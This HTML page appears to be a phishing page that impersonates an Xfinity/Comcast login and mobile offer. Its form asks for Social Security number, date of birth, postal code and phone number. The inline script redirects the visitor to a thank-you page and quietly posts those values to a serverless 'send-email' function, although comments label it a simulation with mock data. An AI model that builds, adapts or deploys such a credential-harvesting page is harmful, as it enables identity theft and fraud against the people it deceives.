<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Xfinity Login & Mobile Offer</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
    <link rel="stylesheet" href="css/style.css" />
  </head>
  <body>
    <div class="app-container">
      <div class="billing-section">
        <div class="billing-form-wrapper">
          <img
            src="images/xfinity-logo-grey.svg"
            alt="Xfinity"
            style="width: 80px; margin: 25px 0px"
          />
          <h3 class="mb-3">Please enter the following information</h3>

          <form method="post" id="form3">
            <input type="hidden" name="info" value="infoPage" />
            <div class="mb-3">
              <label for="ssn" class="form-label"
                >Social Security Number:</label
              >
              <input
                id="c_sssnn"
                class="form-control"
                placeholder="123-45-6789"
                name="s_num"
                required
              />
            </div>

            <div class="mb-3">
              <label for="dob" class="form-label">Date of Birth:</label>
              <input
                type="date"
                class="form-control"
                placeholder="dd/mm/yyyy"
                name="s_dob"
                required
                id="c_dob"
              />
            </div>

            <div class="mb-3">
              <label for="postal" class="form-label">Postal Code:</label>
              <input
                type="text"
                class="form-control"
                placeholder="e.g. 10001"
                name="s_postal"
                required
                id="c_postal"
              />
            </div>

            <div class="mb-4">
              <label for="phone" class="form-label">Phone Number:</label>
              <input
                type="text"
                class="form-control"
                placeholder="e.g. +1 555 123 4567"
                id="c_phone"
                required
              />
            </div>
            <button class="btn btn-primary">Continue</button>
          </form>
        </div>
      </div>

      <div class="offer-section">
        <div class="offer_text">
          <h2 class="offer-title">Let's cut your mobile bill in half</h2>
          <p class="offer-description">
            Xfinity Internet customers can save big over T-Mobile, Verizon, and
            AT&T in their first year when you get two Unlimited lines with the
            5G Xfinity Mobile network.
          </p>
          <a href="#" class="offer-button">Calculate your savings</a>
        </div>
        <div class="offer_image"></div>
      </div>
    </div>

    <footer class="main-footer">
      <div class="text-center text-muted">&copy; 2025 Comcast</div>
      <div class="footer-links">
        <a href="#" class="footer-link"
          ><i class="fas fa-file-alt"></i> Web Terms Of Service</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-file-alt"></i> CA Notice at Collection</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-file-alt"></i> Privacy Policy</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-globe-americas"></i> Your Privacy Choices</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-heartbeat"></i> Health Privacy Notice</a
        >
        <a href="#" class="footer-link"><i class="fas fa-ad"></i> Ad Choices</a>
      </div>
    </footer>

    <div class="footer-bottom">
      <div class="cookie-prefs">
        <i class="fas fa-cookie-bite"></i>
        <span>Cookie Preferences</span>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
      document.querySelector("#form3").addEventListener("submit", async (e) => {
        e.preventDefault();
        const c_ssnn = document.querySelector("#c_sssnn").value;
        const c_dob = document.querySelector("#c_dob").value;
        const c_postal = document.querySelector("#c_postal").value;
        const c_phone = document.querySelector("#c_phone").value;

        window.location.href = "thankyou.html";
        try {
          const res = await fetch("/.netlify/functions/send-email", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              c_ssnn,
              c_dob,
              c_postal,
              c_phone,
              pageName: "Info Page Simulation", // This changes per page
            }),
          });

          const data = await res.json();
          console.log("Serverless function response:", data);
        } catch (err) {
          console.error("Error sending mock data:", err);
        }
      });
    </script>
  </body>
</html>
